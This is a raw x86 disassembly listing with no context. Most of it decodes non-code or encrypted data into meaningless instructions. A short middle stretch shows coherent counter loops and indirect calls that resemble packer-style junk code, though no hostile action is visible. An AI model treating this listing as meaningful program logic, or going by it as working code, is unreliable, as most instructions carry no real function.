  40aa5a:	xor    esi,DWORD PTR [eax+esi*2-0x37]
  40aa5e:	cmp    DWORD PTR [ebx-0x63],ebp
  40aa61:	inc    ecx
  40aa62:	mov    al,ds:0x1d93f107
  40aa67:	fild   QWORD PTR [esi-0x146e1d6e]
  40aa6d:	mov    ecx,0x642d9ae8
  40aa72:	sub    dl,BYTE PTR [edx-0x2]
  40aa75:	push   esp
  40aa76:	jb     0x40aaa3
  40aa78:	lds    eax,FWORD PTR [eax]
  40aa7a:	lds    eax,FWORD PTR [ebp+0x4292aca7]
  40aa80:	dec    BYTE PTR [ecx]
  40aa82:	sar    BYTE PTR [edi+edi*4],1
  40aa85:	pusha  
  40aa86:	adc    eax,0x13b70e09
  40aa8b:	(bad)  
  40aa8c:	push   0x2b07cc10
  40aa91:	sbb    BYTE PTR [ebx-0x48],ch
  40aa94:	les    esp,FWORD PTR [ecx]
  40aa96:	mov    ch,0x1e
  40aa98:	mov    ds:0xb8d4ebe8,al
  40aa9d:	add    DWORD PTR [esi+0x6c],0x22
  40aaa1:	lds    ebp,FWORD PTR [ebx+0x333543b2]
  40aaa7:	sub    BYTE PTR [eax],cl
  40aaa9:	pop    ebx
  40aaaa:	popf   
  40aaab:	inc    ebp
  40aaac:	aam    0xd5
  40aaae:	sbb    edx,ebx
  40aab0:	iret   
  40aab1:	sbb    al,0xd5
  40aab3:	lea    eax,[ecx-0x2940b623]
  40aab9:	iret   
  40aaba:	or     bl,BYTE PTR [ecx-0x54167958]
  40aac0:	aad    0xb1
  40aac2:	jo     0x40aabc
  40aac4:	icebp  
  40aac5:	std    
  40aac6:	pop    edx
  40aac7:	mov    ds:0xcd2e78d8,eax
  40aacc:	xor    eax,0x1b0e3247
  40aad1:	pop    esi
  40aad2:	or     BYTE PTR [edx-0x6a],ah
  40aad5:	sbb    al,0x64
  40aad7:	cmc    
  40aad8:	or     ecx,ebp
  40aada:	push   cs
  40aadb:	adc    dl,BYTE PTR [edi+0x2f691002]
  40aae1:	add    ch,BYTE PTR [edi-0x39]
  40aae4:	jl     0x40ab23
  40aae6:	jmp    0xc047:0x2e6f8475
  40aaed:	mov    bh,0xa
  40aaef:	mov    dh,0x2e
  40aaf1:	aas    
  40aaf2:	ret    0x45f2
  40aaf5:	mov    dl,0xc
  40aaf7:	in     eax,dx
  40aaf8:	or     esp,DWORD PTR [ecx+0x20becf93]
  40aafe:	mov    ch,0x63
  40ab00:	adc    esi,edx
  40ab02:	repnz retf 
  40ab04:	cmp    al,0x73
  40ab06:	gs popa 
  40ab08:	mov    eax,ds:0x703bb4e4
  40ab0d:	mov    ebx,0xbfd46825
  40ab12:	leave  
  40ab13:	cld    
  40ab14:	iret   
  40ab15:	cli    
  40ab16:	mov    al,ds:0xcabffe3a
  40ab1b:	outs   dx,BYTE PTR ds:[esi]
  40ab1c:	jmp    0xb96a:0xf696f740
  40ab23:	inc    edx
  40ab24:	adc    al,ch
  40ab26:	pop    edx
  40ab27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab28:	ror    al,cl
  40ab2a:	cmp    al,0x8f
  40ab2c:	sub    eax,0x1d78d1aa
  40ab31:	inc    esi
  40ab32:	push   ds
  40ab33:	rol    ebp,cl
  40ab35:	lock rcr BYTE PTR [edx],0x52
  40ab39:	lock adc eax,0x4295ba97
  40ab3f:	hlt    
  40ab40:	inc    eax
  40ab41:	pop    edi
  40ab42:	jnp    0x40ab7e
  40ab44:	mov    dl,0xa2
  40ab46:	xor    edx,ebp
  40ab48:	xor    edx,DWORD PTR [ecx+0x35729a26]
  40ab4e:	fcom   st(2)
  40ab50:	and    eax,0x635564f8
  40ab55:	push   cs
  40ab56:	push   cs
  40ab57:	out    dx,al
  40ab58:	pop    ds
  40ab59:	sub    BYTE PTR [edx-0x1f],0xd1
  40ab5d:	push   0xffffffc9
  40ab5f:	xor    cl,dh
  40ab61:	push   ss
  40ab62:	mov    ds:0xbf73f7c9,al
  40ab67:	xchg   ah,al
  40ab69:	dec    esi
  40ab6a:	mov    bh,0xde
  40ab6c:	popf   
  40ab6d:	stos   DWORD PTR es:[edi],eax
  40ab6e:	clc    
  40ab6f:	ror    edi,1
  40ab71:	(bad)  
  40ab73:	push   eax
  40ab74:	popa   
  40ab75:	fs (bad) 
  40ab77:	sbb    BYTE PTR [ecx+0x11f0c479],dh
  40ab7d:	mov    cs,WORD PTR [ebp-0x1dfc9e2d]
  40ab83:	mov    al,0x7c
  40ab85:	xor    eax,0xfdf8b3aa
  40ab8a:	adc    esi,edx
  40ab8c:	push   edi
  40ab8d:	out    0xaa,eax
  40ab8f:	adc    DWORD PTR [esi-0x72dee76b],eax
  40ab95:	and    BYTE PTR [esi+0x633f634d],al
  40ab9b:	or     BYTE PTR [ecx-0x18],bl
  40ab9e:	sbb    DWORD PTR [esi+0x12b45119],0x21
  40aba5:	sbb    BYTE PTR [edi+0x5c],cl
  40aba8:	mov    ebp,0x6e8e42d5
  40abad:	aas    
  40abae:	xchg   esp,eax
  40abaf:	cmp    DWORD PTR [ebp+0x77c72f74],0x67
  40abb6:	cmp    BYTE PTR [ebx+0x72],ch
  40abb9:	xor    al,0xd1
  40abbb:	sub    eax,0x5d703168
  40abc0:	xchg   edi,eax
  40abc1:	pusha  
  40abc2:	lods   eax,DWORD PTR ds:[esi]
  40abc3:	pushf  
  40abc4:	loope  0x40abe5
  40abc6:	mov    al,ds:0x551998c
  40abcb:	(bad)
  40abcf:	jecxz  0x40ab62
  40abd1:	dec    eax
  40abd2:	push   eax
  40abd3:	dec    ecx
  40abd4:	jbe    0x40abe1
  40abd6:	cmp    ch,bh
  40abd8:	xor    edi,DWORD PTR [esi+eiz*4-0x54]
  40abdc:	fdiv   DWORD PTR [esi]
  40abde:	rol    BYTE PTR [esi-0x129dd],1
  40abe4:	xchg   edx,eax
  40abe5:	(bad)  
  40abe6:	ds (bad) 
  40abe8:	and    DWORD PTR [ebp-0x70],eax
  40abeb:	cli    
  40abec:	cld    
  40abed:	fmul   DWORD PTR [esi]
  40abef:	iret   
  40abf0:	adc    bl,BYTE PTR [edi]
  40abf2:	arpl   WORD PTR [eax-0x4942d4af],di
  40abf8:	fidiv  WORD PTR [edi]
  40abfa:	push   ds
  40abfb:	cmp    ah,al
  40abfd:	cmp    esi,DWORD PTR [eax]
  40abff:	div    DWORD PTR [ebx]
  40ac01:	rol    BYTE PTR [ecx+0x42fcf535],1
  40ac07:	add    BYTE PTR [edi],cl
  40ac09:	out    0x42,eax
  40ac0b:	add    BYTE PTR [ebx],al
  40ac0d:	rol    edi,1
  40ac0f:	add    eax,0x42e703
  40ac14:	fwait
  40ac15:	sbb    BYTE PTR [eax],al
  40ac17:	add    BYTE PTR [ebx],bh
  40ac19:	cli    
  40ac1a:	mov    DWORD PTR ds:0x42fcdd,0x36a4
  40ac24:	jb     0x40d88a
  40ac2a:	mov    edx,DWORD PTR [ebp-0x28]
  40ac2d:	sbb    DWORD PTR ds:0x42fd7e,ebx
  40ac33:	mov    edi,DWORD PTR [ebp-0x4]
  40ac36:	xor    edx,eax
  40ac38:	sub    DWORD PTR ds:0x42fcf5,edx
  40ac3e:	xor    edi,eax
  40ac40:	mov    DWORD PTR ds:0x42e6f7,0x1f
  40ac4a:	cmp    DWORD PTR ds:0x42e6f7,0x0
  40ac51:	je     0x40acfa
  40ac57:	cmp    DWORD PTR ds:0x42e6f7,0x2e
  40ac5e:	jne    0x40ac7d
  40ac64:	push   DWORD PTR [ebp-0xc]
  40ac67:	push   0x42e23d
  40ac6c:	push   DWORD PTR [ebp-0x24]
  40ac6f:	push   0x691a
  40ac74:	push   DWORD PTR [ebp-0x10]
  40ac77:	call   DWORD PTR ds:0x42e2f3
  40ac7d:	mov    ebx,DWORD PTR ds:0x42e6f7
  40ac83:	dec    ebx
  40ac84:	mov    DWORD PTR ds:0x42e6f7,ebx
  40ac8a:	jmp    0x40ac4a
  40ac8f:	and    DWORD PTR ds:0x42e128,0x0
  40ac99:	jmp    0x40acad
  40ac9e:	xor    ebx,ebx
  40aca0:	or     ebx,DWORD PTR ds:0x42e128
  40aca6:	inc    ebx
  40aca7:	mov    DWORD PTR ds:0x42e128,ebx
  40acad:	cmp    DWORD PTR ds:0x42e128,0x1a
  40acb4:	jae    0x40acfa
  40acba:	cmp    DWORD PTR ds:0x42e128,0xc
  40acc1:	jne    0x40acd5
  40acc7:	push   0x2dd0
  40accc:	push   DWORD PTR [ebp-0x14]
  40accf:	call   DWORD PTR ds:0x42e2f7
  40acd5:	cmp    DWORD PTR ds:0x42e128,0xb
  40acdc:	jne    0x40acef
  40ace2:	mov    ebx,DWORD PTR ds:0x42e128
  40ace8:	inc    ebx
  40ace9:	mov    DWORD PTR ds:0x42e128,ebx
  40acef:	jmp    0x40ac9e
  40acf4:	adc    ebx,0x2885
  40acfa:	add    edi,ecx
  40acfc:	sbb    ebx,0x5c75
  40ad02:	add    edx,ecx
  40ad04:	imul   edx,edi
  40ad07:	sub    ebx,DWORD PTR ds:0x42e134
  40ad0d:	mov    edi,DWORD PTR [ebp-0x8]
  40ad10:	mov    DWORD PTR ds:0x42fce1,0x13
  40ad1a:	cmp    DWORD PTR ds:0x42fce1,0x0
  40ad21:	je     0x40ad54
  40ad27:	cmp    DWORD PTR ds:0x42fce1,0x14
  40ad2e:	jne    0x40ad42
  40ad34:	push   DWORD PTR [ebp-0x28]
  40ad37:	push   0x42fd01
  40ad3c:	call   DWORD PTR ds:0x42e54b
  40ad42:	mov    ebx,DWORD PTR ds:0x42fce1
  40ad48:	dec    ebx
  40ad49:	mov    DWORD PTR ds:0x42fce1,ebx
  40ad4f:	jmp    0x40ad1a
  40ad54:	mov    ebx,DWORD PTR [ebp-0x10]
  40ad57:	sub    ebx,edi
  40ad59:	cmp    ebx,edx
  40ad5b:	ja     0x40ad6d
  40ad61:	mov    edx,DWORD PTR [ebp-0x4]
  40ad64:	xor    edx,eax
  40ad66:	add    edx,ecx
  40ad68:	jmp    0x40c0fc
  40ad6d:	mov    edx,DWORD PTR [ebp-0x2c]
  40ad70:	mov    edi,DWORD PTR [ebp-0x4]
  40ad73:	xor    edx,eax
  40ad75:	xor    edi,eax
  40ad77:	add    edi,ecx
  40ad79:	add    edx,ecx
  40ad7b:	imul   edx,edi
  40ad7e:	mov    edi,DWORD PTR [ebp-0x8]
  40ad81:	mov    ebx,DWORD PTR [ebp-0x10]
  40ad84:	sub    ebx,edi
  40ad86:	cmp    ebx,edx
  40ad88:	ja     0x40ad96
  40ad8e:	mov    edx,DWORD PTR [ebp-0x28]
  40ad91:	jmp    0x40c0ee
  40ad96:	mov    edx,DWORD PTR [ebp-0x30]
  40ad99:	mov    edi,DWORD PTR [ebp-0x4]
  40ad9c:	xor    edx,eax
  40ad9e:	xor    edi,eax
  40ada0:	add    edi,ecx
  40ada2:	jmp    0x40b160
  40ada7:	xor    BYTE PTR [eax+eiz*4],bl
  40adaa:	mov    bh,0x6c
  40adac:	mov    bl,0xc7
  40adae:	jae    0x40ae09
  40adb0:	jg     0x40ad82
  40adb2:	ja     0x40add7
  40adb4:	jb     0x40adbc
  40adb6:	pushf  
  40adb7:	add    edi,ebp
  40adb9:	jo     0x40ae2b
  40adbb:	lahf   
  40adbc:	jge    0x40ae2e
  40adbe:	jo     0x40ad80
  40adc0:	in     eax,dx
  40adc1:	hlt    
  40adc2:	add    BYTE PTR [edx],bl
  40adc4:	adc    ebp,DWORD PTR [eax]
  40adc6:	outs   dx,DWORD PTR ds:[esi]
  40adc7:	mov    edx,0xcb343538
  40adcc:	scas   al,BYTE PTR es:[edi]
  40adcd:	mov    ds:0x8ee32245,al
  40add2:	jae    0x40adb9
  40add4:	enter  0x8459,0x93
  40add8:	xchg   ecx,eax
  40add9:	lock mov ebx,0x751944d1
  40addf:	iret   
  40ade0:	push   ebp
  40ade1:	out    0xdf,al
  40ade3:	mov    ebp,0xfc5a149f
  40ade8:	jl     0x40ae2f
  40adea:	and    al,0x70
  40adec:	cmp    dl,BYTE PTR [edx]
  40adee:	xor    ecx,edx
  40adf0:	sbb    eax,DWORD PTR [esi]
  40adf2:	test   DWORD PTR [esi+0x54],0x7a14ad98
  40adf9:	xor    ch,BYTE PTR [ebx]
  40adfb:	xor    bh,BYTE PTR [ebx]
  40adfd:	popf   
  40adfe:	stc    
  40adff:	jae    0x40ae4b
  40ae01:	pop    edx
  40ae02:	xchg   esi,eax
  40ae03:	push   eax
  40ae04:	adc    DWORD PTR [edi-0x2],edi
  40ae07:	or     BYTE PTR [eax+0x40],dh
  40ae0a:	sub    al,0x57
  40ae0c:	aaa    
  40ae0d:	xchg   ebp,eax
  40ae0e:	pop    ss
  40ae0f:	sub    eax,DWORD PTR [esi-0x16]
  40ae12:	xchg   ebp,eax
  40ae13:	push   ebp
  40ae14:	popf   
  40ae15:	repz cdq 
  40ae17:	mov    ecx,0xedc492ed
  40ae1c:	jne    0x40ae12
  40ae1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae1f:	shl    dh,1
  40ae21:	push   esp
  40ae22:	or     al,0xbd
  40ae24:	bound  edi,QWORD PTR [edi+edi*4]
  40ae27:	xchg   edi,eax
  40ae28:	pop    edx
  40ae29:	into   
  40ae2a:	sub    DWORD PTR [esi],ebx
  40ae2c:	call   0xea52c19f
  40ae31:	jp     0x40ade6
  40ae33:	sub    edx,esp
  40ae35:	sub    ecx,DWORD PTR [esi-0x5b340310]
  40ae3b:	and    DWORD PTR [esi-0x691cc05a],esp
  40ae41:	jmp    DWORD PTR ds:0x94c4e035
  40ae47:	out    0xf3,eax
  40ae49:	mov    esp,0x8a2db472
  40ae4e:	adc    edx,edi
  40ae50:	mov    ch,0xb
  40ae52:	jmp    0x1e7c073a
  40ae57:	add    BYTE PTR [ecx+0x13d5d9],bh
  40ae5d:	lea    edi,[ebp-0x1f51d7d3]
  40ae63:	jge    0x40ae23
  40ae65:	sub    bh,BYTE PTR [ebx-0x74]
  40ae68:	pop    ebp
  40ae69:	test   eax,ebp
  40ae6b:	or     dh,BYTE PTR [ebx]
  40ae6d:	pop    edi
  40ae6e:	jns    0x40ae06
  40ae70:	hlt    
  40ae71:	cmp    esp,DWORD PTR [edx-0x7fde3a9e]
  40ae77:	dec    edx
  40ae78:	ins    BYTE PTR es:[edi],dx
  40ae79:	sbb    DWORD PTR [edx],ebp
  40ae7b:	pop    edx
  40ae7c:	mov    cl,0x6c
  40ae7e:	inc    edi
  40ae7f:	xor    bh,BYTE PTR [esi+0x1e1cf402]
  40ae85:	push   edx
  40ae86:	lock and DWORD PTR [ecx+eiz*1],edx
  40ae8a:	pop    ebx
  40ae8b:	imul   eax,DWORD PTR [eax-0x80af985],0x75
  40ae92:	daa    
  40ae93:	cwde   
  40ae94:	shl    al,0x11
  40ae97:	cld    
  40ae98:	shl    BYTE PTR [edx+0x7b],0xc5
  40ae9c:	adc    eax,0x9a386810
  40aea1:	jb     0x40ae78
  40aea3:	stos   BYTE PTR es:[edi],al
  40aea4:	cs xchg esp,eax
  40aea6:	dec    eax
  40aea7:	pop    esp
  40aea8:	mov    BYTE PTR [edi],ah
  40aeaa:	adc    BYTE PTR es:[ebp+0x76],0xea
  40aeaf:	xchg   edx,eax
  40aeb0:	js     0x40ae66
  40aeb2:	mov    bh,0x31
  40aeb4:	repnz cs pop edx
  40aeb7:	test   DWORD PTR ds:0x7e51fc8e,0xcabe9d6c
  40aec1:	push   es
  40aec2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aec3:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aec5:	mov    ds:0x30acfc32,al
  40aeca:	push   eax
  40aecb:	jecxz  0x40af15
  40aecd:	and    ebp,esi
  40aecf:	popf   
  40aed0:	xor    al,0xb2
  40aed2:	lods   al,BYTE PTR ds:[esi]
  40aed3:	sbb    dl,dl
  40aed5:	jae    0x40aedb
  40aed7:	push   esp
  40aed8:	dec    ecx
  40aed9:	jmp    0x4e08:0xe8985a4f
  40aee0:	inc    eax
  40aee1:	sub    cl,BYTE PTR [edx+0x6c]
  40aee4:	popf   
  40aee5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aee6:	es call 0xa223:0xd0239756
  40aeee:	push   ebx
  40aeef:	cli    
  40aef0:	lods   al,BYTE PTR ds:[esi]
  40aef1:	mov    ebx,0x5c14df36
  40aef6:	fwait
  40aef7:	aaa    
  40aef8:	out    dx,al
  40aef9:	test   DWORD PTR ds:0xeea9e7ba,ebx
  40aeff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af00:	push   ebx
  40af01:	sub    DWORD PTR [ecx],edi
  40af03:	mov    esp,0x2c40efec
  40af08:	xchg   esi,esi
  40af0a:	add    eax,0x169f6693
  40af0f:	ins    DWORD PTR es:[edi],dx
  40af10:	push   ecx
  40af11:	fld    QWORD PTR [eax]
  40af13:	dec    esi
  40af14:	mov    al,0x26
  40af16:	dec    eax
  40af17:	mov    cl,0xb9
  40af19:	sub    eax,0xfd8f95dd
  40af1e:	rol    DWORD PTR [esi+edi*1+0x23],1
  40af22:	mov    eax,0x73c6897a
  40af27:	sub    DWORD PTR [ecx+0x64],edi
  40af2a:	repnz fcom QWORD PTR [ebp-0x23]
  40af2e:	cli    
  40af2f:	push   ds
  40af30:	xchg   ecx,eax
  40af31:	or     eax,0xe0a161be
  40af36:	adc    ecx,DWORD PTR [esp+edx*4+0x6d]
  40af3a:	cld    
  40af3b:	jle    0x40af0c
  40af3d:	cmc    
  40af3e:	jg     0x40af76
  40af40:	and    edi,DWORD PTR [esi+0x75f8d3a7]
  40af46:	int3   
  40af47:	mov    ebx,0x6b2e1b7f
  40af4c:	xchg   ebx,eax
  40af4d:	mul    dl
  40af4f:	scas   eax,DWORD PTR es:[edi]
  40af50:	xchg   ebx,eax
  40af51:	lea    esp,ss:[ebp-0x71]
  40af55:	(bad)  
  40af57:	sbb    eax,0xa9734f2a
  40af5c:	es sahf 
  40af5e:	xchg   esi,eax
  40af5f:	mov    eax,ds:0xa45996af
  40af64:	outs   dx,BYTE PTR ds:[esi]
  40af65:	push   0xed7b4811
  40af6a:	(bad)  
  40af6b:	cmc    
  40af6c:	mov    esi,0x3ce77850
  40af71:	dec    esp
  40af72:	fs add ah,bl
  40af75:	push   es
  40af76:	nop
  40af77:	xchg   edi,eax
  40af78:	cmp    esp,DWORD PTR [eax+0x24]
  40af7b:	mov    eax,0xb2f28f9d
  40af80:	add    edi,DWORD PTR [esi]
  40af82:	cmp    esi,DWORD PTR [eax+edi*2-0x2]
  40af86:	xchg   edi,eax
  40af87:	adc    esi,ecx
  40af89:	add    al,0x9
  40af8b:	sti    
  40af8c:	mov    esp,0x686e1d02
  40af91:	xchg   ebp,eax
  40af92:	cs test ebp,esi
  40af95:	in     eax,dx
  40af96:	imul   esi,edi,0x4252f348
  40af9c:	test   al,0x4a
  40af9e:	jmp    0xad9c7b05
  40afa3:	xor    BYTE PTR [edi],ah
  40afa5:	aaa    
  40afa6:	imul   edi,DWORD PTR [ebp-0x55e3bf1],0xdb936a2f
  40afb0:	and    cl,ah
  40afb2:	cmp    al,0x6f
  40afb4:	int    0x21
  40afb6:	and    esp,ebp
  40afb8:	xor    ch,BYTE PTR [edx+0x2]
  40afbb:	(bad)  
  40afbc:	sub    BYTE PTR [edx-0x5c],0x94
  40afc0:	lds    edi,FWORD PTR [edx+ebp*4-0xa]
  40afc4:	xchg   ebx,eax
  40afc5:	mov    esp,0x519c66b3
  40afca:	pop    esi
  40afcb:	or     eax,0x5a71ac5
  40afd0:	repnz scas al,BYTE PTR es:[edi]
  40afd2:	pushf  
  40afd3:	add    DWORD PTR [esi-0xda5ad08],edi
  40afd9:	mov    edx,0x2c41ff21
  40afde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40afdf:	(bad)
  40afe2:	sub    BYTE PTR [esi+ebx*4+0x140627a7],al
  40afe9:	sbb    al,0x5a
  40afeb:	pop    esi
  40afec:	scas   eax,DWORD PTR es:[edi]
  40afed:	sub    DWORD PTR [edi-0xc],ebx
  40aff0:	push   ebp
  40aff1:	scas   al,BYTE PTR es:[edi]
  40aff2:	inc    eax
  40aff3:	pop    eax
  40aff4:	cmp    eax,0x35167f2a
  40aff9:	mov    bl,0x52
  40affb:	pop    edx
  40affc:	xor    al,BYTE PTR [edx+0x4e]
  40afff:	mov    ebp,0x965360a0
  40b004:	mov    ah,0xbc
  40b006:	bound  eax,QWORD PTR [ecx]
  40b008:	mov    cl,0xb3
  40b00a:	fwait
  40b00b:	mov    ecx,0xcebe4dc4
  40b010:	jo     0x40afa0
  40b012:	out    0x89,eax
  40b014:	push   edx
  40b015:	mov    bh,0xb8
  40b017:	fisub  DWORD PTR [ebp-0x77]
  40b01a:	sub    al,BYTE PTR [eax+edi*8+0x4c7b9d49]
  40b021:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b022:	aas    
  40b023:	sbb    BYTE PTR [ebx+eax*2-0x47962488],dl
  40b02a:	push   ds
  40b02b:	jns    0x40b070
  40b02d:	add    DWORD PTR [ecx-0x3a],esi
  40b030:	push   ecx
  40b031:	inc    edi
  40b032:	int3   
  40b033:	inc    esi
  40b034:	dec    edx
  40b035:	xchg   BYTE PTR [edi+0x682af878],ah
  40b03b:	popf   
  40b03c:	jecxz  0x40afe9
  40b03e:	mov    eax,0x568050d9
  40b043:	test   eax,0x518c4f48
  40b048:	stos   DWORD PTR es:[edi],eax
  40b049:	out    dx,al
  40b04a:	cmp    ch,BYTE PTR [ebx-0x2f]
  40b04d:	fwait
  40b04e:	and    ah,ah
  40b050:	mov    ch,0x73
  40b052:	mov    esi,0x240dc90e
  40b057:	mov    dl,0x7b
  40b059:	sbb    ah,BYTE PTR [edx-0x67b03eba]
  40b05f:	pop    esi
  40b060:	fidivr DWORD PTR [esi+ebx*4+0x30c31e32]
  40b067:	xor    bh,ch
  40b069:	retf   0xe5a8
  40b06c:	inc    esp
  40b06d:	daa    
  40b06e:	(bad)  es:[edi+0x479cf79c]
  40b075:	dec    edx
  40b076:	push   0x2e
  40b078:	sbb    al,0xf3
  40b07a:	push   edx
  40b07b:	xchg   BYTE PTR [ebp-0x5],dh
  40b07e:	mov    eax,ds:0x686ed912
  40b083:	jae    0x40b0b1
  40b085:	jae    0x40b03f
  40b087:	das    
  40b088:	shl    BYTE PTR [esi],0xbb
  40b08b:	pop    esi
  40b08c:	js     0x40b05d
  40b08e:	adc    DWORD PTR [esi+0x63f663fd],ebx
  40b094:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b095:	stc    
  40b096:	ss add al,0x46
  40b099:	pop    ss
  40b09a:	cld    
  40b09b:	fisttp QWORD PTR [ebx]
  40b09d:	mov    esi,0xfa6f9fc7
  40b0a2:	inc    ebp
  40b0a3:	outs   dx,DWORD PTR ds:[esi]
  40b0a4:	push   0xffffff83
  40b0a6:	bnd je 0x40b082
  40b0a9:	ja     0x40b101
  40b0ab:	dec    esp
  40b0ac:	push   ss
  40b0ad:	dec    edx
  40b0ae:	xor    bh,bl
  40b0b0:	add    bh,BYTE PTR [edx-0x5e]
  40b0b3:	and    dl,BYTE PTR [ecx+0x7e80e38b]
  40b0b9:	out    dx,eax
  40b0ba:	inc    esp
  40b0bb:	js     0x40b05e
  40b0bd:	xchg   esp,eax
  40b0be:	push   edi
  40b0bf:	jb     0x40b0b2
  40b0c1:	sub    BYTE PTR [ebx+ebx*2+0x1410c1c4],0xa4
  40b0c9:	add    BYTE PTR [eax],0x63
  40b0cc:	in     eax,dx
  40b0cd:	cs mov edi,0x2d0de71d
  40b0d3:	gs (bad) 
  40b0d5:	(bad)  
  40b0d6:	jmp    0x1a56:0x84785df8
  40b0dd:	jle    0x40b09e
  40b0df:	xor    eax,0x63d22c1f
  40b0e4:	rol    BYTE PTR [esi],cl
  40b0e6:	inc    edi
  40b0e7:	iret   
  40b0e8:	daa    
  40b0e9:	sbb    DWORD PTR ds:0xb15976d2,esi
  40b0ef:	js     0x40b0c4
  40b0f1:	arpl   WORD PTR ds:0x1d1b1427,di
  40b0f7:	sbb    ecx,edx
  40b0f9:	inc    ebp
  40b0fa:	mov    edi,ebx
  40b0fc:	mov    BYTE PTR [edi],ah
  40b0fe:	mov    al,ds:0x13adf2cd
  40b103:	xor    al,0x6
  40b105:	pushf  
  40b106:	pop    ebx
  40b107:	jg     0x40b0c8
  40b109:	mov    ch,0x8b
  40b10b:	popf   
  40b10c:	adc    al,0xe
  40b10e:	push   cs
  40b10f:	jecxz  0x40b12e
  40b111:	mov    ds:0xc101c289,al
  40b116:	loopne 0x40b145
  40b118:	mov    esp,0xb63dbd16
  40b11d:	jmp    0x5f0d:0x7ec763ef
  40b124:	or     eax,0x2f807f8e
  40b129:	xlat   BYTE PTR ds:[ebx]
  40b12a:	fsubr  QWORD PTR ds:0x3caf5ce3
  40b130:	mov    edx,ds
  40b132:	inc    ebx
  40b133:	int3   
  40b134:	xor    eax,0xd64f6b2
  40b139:	inc    edi
  40b13a:	sbb    DWORD PTR [ebx+eiz*8-0x44],0xffffffc3
  40b13f:	les    esi,FWORD PTR [ebp+0x61]
  40b142:	mov    DWORD PTR [ecx+0x4e],esi
  40b145:	adc    al,0x1f
  40b147:	dec    edx
  40b148:	mov    DWORD PTR [ecx],esp
  40b14a:	xlat   BYTE PTR ds:[ebx]
  40b14b:	jbe    0x40b123
  40b14d:	mov    ebx,0xad5d5829
  40b152:	sub    al,0xd7
  40b154:	dec    ebp
  40b155:	add    ebx,esp
  40b157:	sub    eax,0xab240aac
  40b15c:	xchg   ebx,eax
  40b15d:	xrelease xchg DWORD PTR [edi-0x46162efd],ebp
  40b164:	add    eax,DWORD PTR [eax]
  40b166:	add    dl,dl
  40b168:	jne    0x40b1a1
  40b16a:	sub    esi,DWORD PTR [ebx-0x188a2d97]
  40b170:	retf   0xa792
  40b173:	adc    BYTE PTR [ebp-0x55d6bd5],ch
  40b179:	jo     0x40b1eb
  40b17b:	lahf   
  40b17c:	jge    0x40b1ee
  40b17e:	jo     0x40b1af
  40b180:	sbb    ecx,DWORD PTR [ebp+edx*1+0x4d]
  40b184:	mov    bl,0x55
  40b186:	std    
  40b187:	sbb    cl,BYTE PTR [ecx+0x6b]
  40b18a:	and    al,0xf1
  40b18c:	sub    BYTE PTR [edx],bh
  40b18e:	push   ebx
  40b18f:	outs   dx,BYTE PTR ds:[esi]
  40b190:	push   ebp
  40b191:	retf   
  40b192:	inc    esp
  40b193:	stc    
  40b194:	mov    ah,0xa9
  40b196:	mov    dh,0x10
  40b198:	xchg   ebp,eax
  40b199:	cmp    al,0x48
  40b19b:	call   0x3de46314
  40b1a0:	xor    eax,0x6d08aa99
  40b1a5:	dec    edx
  40b1a6:	add    al,0xe
  40b1a8:	xor    DWORD PTR [eax-0xe],0x54
  40b1ac:	rol    BYTE PTR [esi+edi*8-0x5e],1
  40b1b0:	ss leave 
  40b1b2:	mov    eax,0x84a137df
  40b1b7:	adc    al,0xe7
  40b1b9:	loopne 0x40b1fb
  40b1bb:	push   ebp
  40b1bc:	pop    edi
  40b1bd:	xchg   DWORD PTR [edx+ebp*2-0x18ce8495],esp
  40b1c4:	mov    edi,0xe09e5c8a
  40b1c9:	outs   dx,DWORD PTR ds:[esi]
  40b1ca:	imul   esp,eax,0xfd57446c
  40b1d0:	int3   
  40b1d1:	(bad)  
  40b1d2:	jbe    0x40b1a9
  40b1d4:	cmp    eax,0xb8b27ca
  40b1d9:	mov    esp,0xb05a7d12
  40b1de:	(bad)  
  40b1df:	sti    
  40b1e0:	loop   0x40b1c9
  40b1e2:	sub    esp,DWORD PTR [ecx+0x3f]
  40b1e5:	cld    
  40b1e6:	xlat   BYTE PTR ds:[ebx]
  40b1e7:	cli    
  40b1e8:	cs icebp 
  40b1ea:	push   eax
  40b1eb:	in     eax,dx
  40b1ec:	mul    dl
  40b1ee:	cld    
  40b1ef:	cmp    eax,0x36d179fc
  40b1f4:	and    ebx,esi
  40b1f6:	mov    esp,0x8b5c2363
  40b1fb:	outs   dx,BYTE PTR ds:[esi]
  40b1fc:	mov    WORD PTR [ecx+0xf],sp
  40b200:	dec    ecx
  40b201:	popa   
  40b202:	inc    edi
  40b203:	mov    DWORD PTR [eax+0x29f958e6],0x41431d7f
  40b20d:	jb     0x40b265
  40b20f:	fld    st(3)
  40b211:	pop    edx
  40b212:	mov    ah,0xc8
  40b214:	xchg   ecx,eax
  40b215:	test   al,0x8
  40b217:	add    eax,0x8f02f4e0
  40b21c:	mov    es,esp
  40b21e:	ret    
  40b21f:	lods   al,BYTE PTR ds:[esi]
  40b220:	push   cs
  40b221:	inc    eax
  40b222:	jmp    0x53ee95c
  40b227:	ja     0x40b1ea
  40b229:	retf   0xfd1f
  40b22c:	mov    WORD PTR [edi-0x2cd4aad4],cs
  40b232:	jl     0x40b29c
  40b234:	fwait
  40b235:	adc    cl,BYTE PTR [ecx-0x60829d47]
  40b23b:	(bad)  
  40b23c:	xor    DWORD PTR [ebx-0x23],ebx
  40b23f:	sub    eax,0xeb8e5656
  40b244:	fst    DWORD PTR [ecx+0x11810ec2]
  40b24a:	pusha  
  40b24b:	into   
  40b24c:	inc    edi
  40b24d:	cmp    DWORD PTR [ebx],0x42
  40b250:	xchg   ebp,eax
  40b251:	imul   ecx,ecx,0xffffffcc
  40b254:	pop    ss
  40b255:	sbb    ecx,DWORD PTR [ebp-0x19c2b392]
  40b25b:	(bad)  
  40b25c:	xor    BYTE PTR [edi+eiz*4],dh
  40b25f:	jl     0x40b1ec
  40b261:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b262:	in     al,dx
  40b263:	fld    QWORD PTR [ecx-0x4a70f9b7]
